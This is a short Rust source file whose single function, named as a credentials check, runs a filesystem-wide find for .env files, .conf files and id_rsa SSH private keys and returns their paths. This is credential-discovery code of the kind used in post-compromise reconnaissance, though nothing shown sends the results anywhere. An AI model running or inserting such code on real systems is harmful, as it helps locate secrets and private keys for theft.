#![allow(unused_parens)]
#![allow(unused_must_use)]
use std::process::{Command, Stdio, Output};

pub fn run_initial_creds_check() -> String {
    let output: Output = Command::new("find")
        .args(["/", "-name", "*.env", "-o", "-name", "*.conf", "-o", "-name", "id_rsa"])
        .stderr(Stdio::null())
        .output()
        .expect("Failed to run initial group check");

    if !output.status.success() || output.stdout.is_empty() {
        return String::new();
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    return stdout.to_string();
}